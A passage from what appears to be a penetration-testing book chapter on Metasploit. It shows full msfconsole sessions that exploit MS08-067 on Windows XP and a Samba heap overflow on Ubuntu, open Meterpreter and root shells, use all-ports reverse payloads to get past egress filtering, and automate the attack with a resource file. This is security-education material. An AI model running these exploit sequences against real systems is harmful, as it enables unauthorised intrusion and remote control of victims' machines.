   3   Windows XP SP2 English (NX)</pre><p class="calibre2">We search for the MS08-067 NetAPI exploit in the Framework at <span class="inlinemediaobject"><a id="I_inlinemediaobject5_d1e5577" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span>. Then, having found our exploit, we load the <span class="strong"><em class="calibre4">windows/smb/ms08_067_netapi</em></span> exploit at <span class="inlinemediaobject"><a id="I_inlinemediaobject5_d1e5586" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span>.<a id="IDX-CHP-5-0052" class="strong"/><a id="IDX-CHP-5-0053" class="strong"/><a id="IDX-CHP-5-0054" class="strong"/><a id="IDX-CHP-5-0055" class="strong"/><a id="IDX-CHP-5-0056" class="strong"/><a id="IDX-CHP-5-0057" class="strong"/><a id="IDX-CHP-5-0058" class="strong"/><a id="IDX-CHP-5-0059" class="strong"/><a id="IDX-CHP-5-0060" class="strong"/></p><p class="calibre2">Next, at <span class="inlinemediaobject"><a id="I_inlinemediaobject5_d1e5622" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span> we set the payload as Windows-based Meterpreter <code class="literal">reverse_tcp</code>, which, if successful, will start a connection on the target machine and connect back to the attacking machine specified with <code class="literal">LHOST</code>. This is important if you find that a firewall is in place and you need to bypass incoming controls on a firewall or NAT.</p><p class="calibre2"><span class="strong"><em class="calibre4">Meterpreter</em></span> is a post exploitation tool that we’ll use through this book. One of Metasploit’s flagship tools, it makes extracting information or further compromising systems significantly easier.</p><p class="calibre2">The <code class="literal">show targets</code> command at <span class="inlinemediaobject"><a id="I_inlinemediaobject5_d1e5643" class="strong"/><img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre8"/></span> allows us to identify the system we want to target. (Although many MSF exploits use automatic targeting and don’t require this flag, autodetection capability generally fails in MS08-067.)</p><p class="calibre2">We then set our target to <code class="literal">Windows XP SP2 English (NX)</code> at <span class="inlinemediaobject"><a id="I_inlinemediaobject5_d1e5654" class="strong"/><img src="../images/00007.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867468.png" class="calibre8"/></span>. The <code class="literal">NX</code> stands for No Execute. By default in Windows XP SP2, DEP is enabled.</p><p class="calibre2">At <span class="inlinemediaobject"><a id="I_inlinemediaobject5_d1e5665" class="strong"/><img src="../images/00026.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867506.png" class="calibre8"/></span> we set the IP address of our target machine which, by defining the <code class="literal">RHOST</code> value, is vulnerable to the MS08-067 exploit.<a id="IDX-CHP-5-0061" class="strong"/></p><p class="calibre2">The <code class="literal">set LHOST</code> command at <span class="inlinemediaobject"><a id="I_inlinemediaobject5_d1e5682" class="strong"/><img src="../images/00027.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867508.png" class="calibre8"/></span> specifies our attacking machine’s IP address (the Back|Track machine), and the <code class="literal">LPORT</code> option at <span class="inlinemediaobject"><a id="I_inlinemediaobject5_d1e5691" class="strong"/><img src="../images/00028.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867510.png" class="calibre8"/></span> specifies the port to which our attacker machine will listen for a connection from our target. (When you’re setting the <code class="literal">LPORT</code> option, use a standard port that you think will be allowed through the firewall: Ports 443, 80, 53, and 8080 are often good options.) Finally, we enter <code class="literal">show options</code> at <span class="inlinemediaobject"><a id="I_inlinemediaobject5_d1e5704" class="strong"/><img src="../images/00029.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867512.png" class="calibre8"/></span> to make sure that the options are set up correctly.</p><p class="calibre2">Having set the stage, we’re ready to conduct the actual exploitation:<a id="IDX-CHP-5-0062" class="strong"/><a id="IDX-CHP-5-0063" class="strong"/><a id="IDX-CHP-5-0064" class="strong"/><a id="IDX-CHP-5-0065" class="strong"/><a id="IDX-CHP-5-0066" class="strong"/><a id="IDX-CHP-5-0067" class="strong"/><a id="IDX-CHP-5-0068" class="strong"/><a id="IDX-CHP-5-0069" class="strong"/><a id="IDX-CHP-5-0070" class="strong"/></p><a id="I_programlisting5_d1e5741" class="strong"/><pre class="programlisting">msf exploit(ms08_067_netapi) &gt; <strong class="calibre3"><code class="calibre6">exploit</code></strong> <img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/>
[*] Started reverse handler on 192.168.33.129:8080
[*] Triggering the vulnerability...
[*] Sending stage (748032 bytes)
[*] Meterpreter session 1 opened (192.168.33.129:8080 -&gt; 192.168.33.130:1487) <img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/>
msf exploit(ms08_067_netapi) &gt; <strong class="calibre3"><code class="calibre6">sessions -l</code></strong> <img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/>

Active sessions
===============

  Id  Type         Information  Connection
  --  ----         -----------  ----------
  1   meterpreter               192.168.33.129:8080 -&gt; 192.168.33.130:1036 <img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre7"/>

msf exploit(ms08_067_netapi) &gt; <strong class="calibre3"><code class="calibre6">sessions -i 1</code></strong> <img src="../images/00007.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867468.png" class="calibre7"/>
[*] Starting interaction with 1...

meterpreter &gt; <strong class="calibre3"><code class="calibre6">shell</code></strong> <img src="../images/00026.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867506.png" class="calibre7"/>
Process 4060 created.
Channel 1 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32&gt;</pre><p class="calibre2">The <code class="literal">exploit</code> command at <span class="inlinemediaobject"><a id="I_inlinemediaobject5_d1e5797" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> initiates our exploit and attempts to attack the target. The attack succeeds and gives us a <code class="literal">reverse_tcp</code> Meterpreter payload at <span class="inlinemediaobject"><a id="I_inlinemediaobject5_d1e5806" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span>, which we can view with <code class="literal">sessions -l</code> at <span class="inlinemediaobject"><a id="I_inlinemediaobject5_d1e5816" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span>. Only one session is active, as shown at <span class="inlinemediaobject"><a id="I_inlinemediaobject5_d1e5822" class="strong"/><img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre8"/></span>, but if we targeted multiple systems, several sessions could be open simultaneously. (To view a list of the exploits that created each session, you would enter <code class="literal">sessions -l -v</code>.)</p><p class="calibre2">The <code class="literal">sessions -i 1</code> command is issued at <span class="inlinemediaobject"><a id="I_inlinemediaobject5_d1e5836" class="strong"/><img src="../images/00007.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867468.png" class="calibre8"/></span> to “interact” with an individual session. Notice that this drops us into a Meterpreter shell. If, for example, a reverse command shell existed, this command would drop us straight to a command prompt. And, finally, at <span class="inlinemediaobject"><a id="I_inlinemediaobject5_d1e5842" class="strong"/><img src="../images/00026.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867506.png" class="calibre8"/></span> we enter <code class="literal">shell</code> to jump into an interactive command shell on the target.<a id="IDX-CHP-5-0071" class="strong"/></p><p class="calibre2">Congratulations! You’ve just compromised your first machine! To list the available commands for a particular exploit, you can enter <code class="literal">show options</code>.</p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="exploiting_an_ubuntu_machine">Exploiting an Ubuntu Machine</h2></div></div></div><p class="calibre2">Let’s try a different exploit on an Ubuntu 9.04 virtual machine. The steps are pretty much the same as for the preceding exploit except that we will select a different payload.</p><a id="I_programlisting5_d1e5865" class="strong"/><pre class="programlisting">msf &gt; <strong class="calibre3"><code class="calibre6">nmap -sT -A -P0 192.168.33.132</code></strong>
[*] exec: nmap -sT -A -P0 192.168.33.132

Starting Nmap 5.20 ( http://nmap.org ) at 2011-03-15 19:35 EDT
Warning: Traceroute does not support idle or connect scan, disabling...
Nmap scan report for 192.168.33.132
Host is up (0.00048s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE     VERSION
<strong class="calibre3"><code class="calibre6">80/tcp  open</code></strong>  http        Apache httpd 2.2.3 ((<strong class="calibre3"><code class="calibre6">Ubuntu</code></strong>) PHP/5.2.1) <img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/>
|_html-title: Index of /
<strong class="calibre3"><code class="calibre6">139/tcp open</code></strong>  netbios-ssn <strong class="calibre3"><code class="calibre6">Samba</code></strong> smbd 3.X (workgroup: MSHOME) <img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/>
<strong class="calibre3"><code class="calibre6">445/tcp open</code></strong>  netbios-ssn <strong class="calibre3"><code class="calibre6">Samba</code></strong> smbd 3.X (workgroup: MSHOME)
MAC Address: 00:0C:29:21:AD:08 (VMware)
No exact OS matches for host (If you know what OS is running
 on it, see http://nmap.org/submit/ ).

<strong class="calibre3"><code class="calibre6">. . . SNIP . . .</code></strong>

Host script results:
|_nbstat: NetBIOS name: UBUNTU, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt;
|_smbv2-enabled: Server doesn't support SMBv2 protocol
| smb-os-discovery:
|   OS: Unix (Samba 3.0.24)
|   Name: MSHOME\Unknown
|_  System time: 2011-03-15 17:39:57 UTC-4

OS and Service detection performed. Please report any incorrect
 results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.11 seconds</pre><p class="calibre2">We see three open ports: 80, 139, and 445. The message at <span class="inlinemediaobject"><a id="I_inlinemediaobject5_d1e5906" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> tells us that the system is running Ubuntu, and at <span class="inlinemediaobject"><a id="I_inlinemediaobject5_d1e5912" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span> we see that it is running a version of Samba 3.<span class="strong"><em class="calibre4">x</em></span> and Apache 2.2.3 with PHP 5.2.1.<a id="IDX-CHP-5-0072" class="strong"/></p><p class="calibre2">Let’s search for a Samba exploit and try it against the system:<a id="IDX-CHP-5-0073" class="strong"/><a id="IDX-CHP-5-0074" class="strong"/><a id="IDX-CHP-5-0075" class="strong"/><a id="IDX-CHP-5-0076" class="strong"/><a id="IDX-CHP-5-0077" class="strong"/></p><a id="I_programlisting5_d1e5943" class="strong"/><pre class="programlisting">msf &gt; <strong class="calibre3"><code class="calibre6">search samba</code></strong>
[*] Searching loaded modules for pattern 'samba'...

Auxiliary
=========
   Name                               Rank    Description
   ----                               ----    -----------
   admin/smb/samba_symlink_traversal  normal  Samba Symlink Directory Traversal
   dos/samba/lsa_addprivs_heap        normal  Samba lsa_io_privilege_set Heap Overflow
   dos/samba/lsa_transnames_heap      normal  Samba lsa_io_trans_names Heap <strong class="calibre3"><code class="calibre6">Overflow</code></strong>

Exploits
========

   Name                                 Rank       Description
   ----                                 ----       -----------
   <strong class="calibre3"><code class="calibre6">linux/samba/lsa_transnames_heap      good       Samba lsa_io_trans_names . . .</code></strong>

<strong class="calibre3"><code class="calibre6">. . . SNIP . . .</code></strong>

msf &gt; <strong class="calibre3"><code class="calibre6">use linux/samba/lsa_transnames_heap</code></strong>
msf exploit(lsa_transnames_heap) &gt; <strong class="calibre3"><code class="calibre6">show payloads</code></strong>
Compatible Payloads
===================

   Name                              Rank    Description
   ----                              ----    -----------
   generic/debug_trap                normal  Generic x86 Debug Trap
   generic/shell_bind_tcp            normal  Generic Command Shell, Bind TCP Inline
   generic/shell_reverse_tcp         normal  Generic Command Shell, Reverse TCP Inline
   linux/x86/adduser                 normal  Linux Add User
   linux/x86/chmod                   normal  Linux Chmod
   linux/x86/exec                    normal  Linux Execute Command
   linux/x86/metsvc_bind_tcp         normal  Linux Meterpreter Service, Bind TCP
   linux/x86/metsvc_reverse_tcp      normal  Linux Meterpreter
 Service, Reverse TCP Inline
   linux/x86/shell/bind_ipv6_tcp     normal  Linux Command Shell,
 Bind TCP Stager (IPv6)
   linux/x86/shell/bind_tcp          normal  Linux Command Shell, Bind TCP Stager

<strong class="calibre3"><code class="calibre6">. . . SNIP . . .</code></strong>

msf exploit(lsa_transnames_heap) &gt; <strong class="calibre3"><code class="calibre6">set payload linux/x86/shell_bind_tcp</code></strong>
payload =&gt; linux/x86/shell_bind_tcp
msf exploit(lsa_transnames_heap) &gt; <strong class="calibre3"><code class="calibre6">set LPORT 8080</code></strong>
LPORT =&gt; 8080
msf exploit(lsa_transnames_heap) &gt; <strong class="calibre3"><code class="calibre6">set RHOST 192.168.33.132</code></strong>
RHOST =&gt; 192.168.33.132
msf exploit(lsa_transnames_heap) &gt; <strong class="calibre3"><code class="calibre6">exploit</code></strong>

[*] Creating nop sled....
[*] Started bind handler
[*] Trying to exploit Samba with address 0xffffe410...
[*] Connecting to the SMB service...

<strong class="calibre3"><code class="calibre6">. . . SNIP . . .</code></strong>

[*] Calling the vulnerable function...
[+] Server did not respond, this is expected
[*] Command shell session 1 opened (192.168.33.129:41551 -&gt; 192.168.33.132:8080)
<strong class="calibre3"><code class="calibre6">ifconfig</code></strong>
eth1      Link encap:Ethernet  HWaddr 00:0C:29:21:AD:08
          inet addr:192.168.33.132  Bcast:192.168.33.255  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:3178 errors:0 dropped:0 overruns:0 frame:0
          TX packets:2756 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:292351 (285.4 KiB)  TX bytes:214234 (209.2 KiB)
          Interrupt:17 Base address:0x2000

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:0 (0.0 b)  TX bytes:0 (0.0 b)

<strong class="calibre3"><code class="calibre6">whoami</code></strong>
root</pre><p class="calibre2">This type of exploit, called a <span class="strong"><em class="calibre4">heap-based attack</em></span>, takes advantage of dynamic memory allocation, but it isn’t 100 percent reliable. (You may need to attempt the <code class="literal">exploit</code> command a few times if it doesn’t work the first time.)<a id="IDX-CHP-5-0078" class="strong"/><a id="IDX-CHP-5-0079" class="strong"/></p><p class="calibre2">Notice in this example that we used a <span class="strong"><em class="calibre4">bind</em></span> shell to set up a listener port on the target machine; Metasploit handles the direct connection to the system automatically for us. (Remember to use the reverse payload when attacking through a firewall or NAT.)</p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="all-ports_payloads_colon_brute_forcing_p">All-Ports Payloads: Brute Forcing Ports</h2></div></div></div><p class="calibre2">In the preceding examples, we’ve relied on the reverse port always being open. But what if we’re attacking an organization with very strict egress port filtering? Most companies block outbound connections except those from a few defined ports, and it can be difficult to determine which ports can make outbound connections.</p><p class="calibre2">We can guess that port 443 won’t be inspected and will allow a TCP connection out, and that FTP, Telnet, SSH, and HTTP may be allowed. But why guess when Metasploit has a very specific payload for use in finding open ports?</p><p class="calibre2">Metasploit’s payload will try every available port until it finds an open one. (Going through the entire port range [1–65535] can take quite a long time, however.)</p><p class="calibre2">Let’s use this payload and have it try all ports connecting outbound until we get one that is successful:</p><a id="I_programlisting5_d1e6021" class="strong"/><pre class="programlisting">msf &gt; <strong class="calibre3"><code class="calibre6">use windows/smb/ms08_067_netapi</code></strong>
msf exploit(ms08_067_netapi) &gt; <strong class="calibre3"><code class="calibre6">set LHOST 192.168.33.129</code></strong>
lhost =&gt; 192.168.33.129
smsf exploit(ms08_067_netapi) &gt; <strong class="calibre3"><code class="calibre6">set RHOST 192.168.33.130</code></strong>
rhost =&gt; 192.168.33.130
msf exploit(ms08_067_netapi) &gt; <strong class="calibre3"><code class="calibre6">set TARGET 3</code></strong>
target =&gt; 3
msf exploit(ms08_067_netapi) &gt; <strong class="calibre3"><code class="calibre6">search ports</code></strong>
[*] Searching loaded modules for pattern 'ports'...

Compatible Payloads
===================

   Name                                       Rank    Description
   ----                                       ----    -----------
   windows/dllinject/reverse_tcp_allports     normal  Reflective Dll Injection,
                                                        Reverse All-Port TCP Stager
   windows/meterpreter/reverse_tcp_allports   normal  Windows Meterpreter (Reflective

       Injection), Reverse All-Port TCP Stager

<strong class="calibre3"><code class="calibre6">. . . SNIP . . .</code></strong>

msf exploit(ms08_067_netapi) &gt; <strong class="calibre3"><code class="calibre6">set PAYLOAD windows/meterpreter/reverse_tcp_allports</code></strong>
payload =&gt; windows/meterpreter/reverse_tcp_allports
msf exploit(ms08_067_netapi) &gt; <strong class="calibre3"><code class="calibre6">exploit -j</code></strong>
[*] Exploit running as background job.
msf exploit(ms08_067_netapi) &gt;
[*] Started reverse handler on 192.168.33.129:1 <img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/>
[*] Triggering the vulnerability...
[*] Sending stage (748032 bytes)
[*] Meterpreter session 1 opened (192.168.33.129:1 -&gt; 192.168.33.130:1047) <img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/>

msf exploit(ms08_067_netapi) &gt; <strong class="calibre3"><code class="calibre6">sessions -l -v</code></strong>

Active sessions
===============

  Id  Type         Information
                Connection                               Via
  --  ----         -----------
                        ----------                               ---
  1   meterpreter  NT AUTHORITY\SYSTEM @ IHAZSECURITY  192.
168.33.129:1 -&gt; 192.168.33.130:1047

    exploit/windows/smb/ms08_067_netapi

msf exploit(ms08_067_netapi) &gt; <strong class="calibre3"><code class="calibre6">sessions -i 1</code></strong>
[*] Starting interaction with 1...

meterpreter &gt;</pre><p class="calibre2">Notice that we do not set an <code class="literal">LPORT</code>; instead, we use <code class="literal">allports</code> because we are going to try to connect out of the network on each port until we find an open one. If you look closely at <span class="inlinemediaobject"><a id="I_inlinemediaobject5_d1e6075" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> you will see that our attacker machine is bound to <code class="literal">:1</code> (all ports) and that it finds a port outbound on port 1047 <span class="inlinemediaobject"><a id="I_inlinemediaobject5_d1e6084" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span> on the target network.<a id="IDX-CHP-5-0080" class="strong"/><a id="IDX-CHP-5-0081" class="strong"/><a id="IDX-CHP-5-0082" class="strong"/><a id="IDX-CHP-5-0083" class="strong"/><a id="IDX-CHP-5-0084" class="strong"/><a id="IDX-CHP-5-0085" class="strong"/><a id="IDX-CHP-5-0086" class="strong"/></p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="resource_files">Resource Files</h2></div></div></div><p class="calibre2"><span class="strong"><em class="calibre4">Resource files</em></span> are script files that automate commands within <span class="strong"><em class="calibre4">msfconsole</em></span>. They contain a list of commands that are executed from <span class="strong"><em class="calibre4">msfconsole</em></span> and run sequentially. Resource files can greatly reduce testing and development times, allowing you to automate many repetitive tasks, including exploitation.</p><p class="calibre2">Resource files can be loaded from <span class="strong"><em class="calibre4">msfconsole</em></span> with the <code class="literal">resource</code> command, or they can be passed as a command-line argument with the <code class="literal">-r</code> switch.</p><p class="calibre2">The simple example shown next creates a resource file that displays our Metasploit version and then loads the sounds plug-in:</p><a id="I_programlisting5_d1e6140" class="strong"/><pre class="programlisting">root@bt:/opt/framework3/msf3/ <strong class="calibre3"><code class="calibre6">echo version &gt; resource.rc</code></strong> <img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/>
  root@bt:/opt/framework3/msf3/ <strong class="calibre3"><code class="calibre6">echo load sounds &gt;&gt; resource.rc</code></strong> <img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/>
  root@bt:/opt/framework3/msf3/ <strong class="calibre3"><code class="calibre6">msfconsole -r resource.rc</code></strong> <img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/>
<img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre7"/> resource (resource.rc)&gt; version
  Framework: 3.7.0-dev.12220
  Console  : 3.7.0-dev.12220
  resource (resource.rc)&gt; load sounds
  [*] Successfully loaded plugin: sounds
  msf &gt;</pre><p class="calibre2">As you can see at <span class="inlinemediaobject"><a id="I_inlinemediaobject5_d1e6178" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> and <span class="inlinemediaobject"><a id="I_inlinemediaobject5_d1e6184" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span>, the <code class="literal">version</code> and <code class="literal">load sounds</code> commands are echoed into a text file called <span class="strong"><em class="calibre4">resource.rc</em></span>. This file is then passed to <span class="strong"><em class="calibre4">msfconsole</em></span> at the command line at <span class="inlinemediaobject"><a id="I_inlinemediaobject5_d1e6203" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span> with the <code class="literal">-r</code> switch, and when the file begins to load, the commands are executed at <span class="inlinemediaobject"><a id="I_inlinemediaobject5_d1e6212" class="strong"/><img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre8"/></span> from the resource file.</p><p class="calibre2">A more complex resource file might automatically run a particular exploit against a machine in your lab environment. For example, the following listing uses an SMB exploit in a newly created resource file called <span class="strong"><em class="calibre4">autoexploit.rc</em></span>. We set a payload and our attack and target IPs in this one file so that we don’t have to specify these options manually when attempting this exploit.<a id="IDX-CHP-5-0087" class="strong"/></p><a id="I_programlisting5_d1e6226" class="strong"/><pre class="programlisting">root@bt:/opt/framework3/msf3/
<strong class="calibre3"><code class="calibre6">echo use exploit/windows/smb/ms08_067_netapi &gt; autoexploit.rc</code></strong>
root@bt:/opt/framework3/msf3/ <strong class="calibre3"><code class="calibre6">echo set RHOST 192.168.1.155 &gt;&gt; autoexploit.rc</code></strong>
root@bt:/opt/framework3/msf3/
 <strong class="calibre3"><code class="calibre6">echo set PAYLOAD windows/meterpreter/reverse_tcp &gt;&gt; autoexploit.rc</code></strong>
root@bt:/opt/framework3/msf3/ <strong class="calibre3"><code class="calibre6">echo set LHOST 192.168.1.101 &gt;&gt; autoexploit.rc</code></strong>
root@bt:/opt/framework3/msf3/ <strong class="calibre3"><code class="calibre6">echo exploit &gt;&gt; autoexploit.rc</code></strong>
root@bt:/opt/framework3/msf3/ <strong class="calibre3"><code class="calibre6">msfconsole</code></strong>
msf &gt; <strong class="calibre3"><code class="calibre6">resource autoexploit.rc</code></strong>
resource (autoexploit.rc)<img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/>&gt; use exploit/windows/smb/ms08_067_netapi
resource (autoexploit.rc)&gt; set RHOST 192.168.1.155
RHOST =&gt; 192.168.1.155
resource (autoexploit.rc)&gt; set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD =&gt; windows/meterpreter/reverse_tcp
resource (autoexploit.rc)&gt; set LHOST 192.168.1.101
LHOST =&gt; 192.168.1.101
resource (autoexploit.rc)&gt; exploit

[*] Started reverse handler on 192.168.1.101:4444
[*] Triggering the vulnerability...
[*] Sending stage (747008 bytes)
[*] Meterpreter session 1 opened (192.168.1.101:4444 -&gt; 192.168.1.155:1033)

meterpreter &gt;</pre><p class="calibre2">Here we specify the resource file within <span class="strong"><em class="calibre4">msfconsole</em></span>, and it automatically runs our specified commands as shown by the output displayed at <span class="inlinemediaobject"><a id="I_inlinemediaobject5_d1e6261" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span>.</p><div class="book"><hr class="calibre5"/></div><div class="note"><h3 class="title4">Note</h3><p class="calibre2">These are just a couple of simple examples. In <a class="xref" href="part0016.html#karmetasploit">Chapter 12</a>, you will learn how to use <span class="strong"><em class="calibre4">karma</em></span>, a very large resource file.</p></div><div class="book"><hr class="calibre5"/></div></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="wrapping_up-id1">Wrapping Up</h2></div></div></div><p class="calibre2">You’ve just exploited your first machine and gained full access to it with <span class="strong"><em class="calibre4">msfconsole</em></span>. Congratulations!</p><p class="calibre2">We began this chapter by covering the basics of exploitation and compromising a target based on a discovered vulnerability. Exploitation is about identifying a system’s potential exposures and exploiting its weaknesses. We used <span class="strong"><em class="calibre4">nmap</em></span> to identify potentially vulnerable services. From there we launched an exploit that gave us access to a system.</p><p class="calibre2">In the next chapter, we will explore Meterpreter in more detail as we learn how to use it in post exploitation. You will find Meterpreter to be an amazing tool once you’ve compromised a system.</p></div></section></body></html>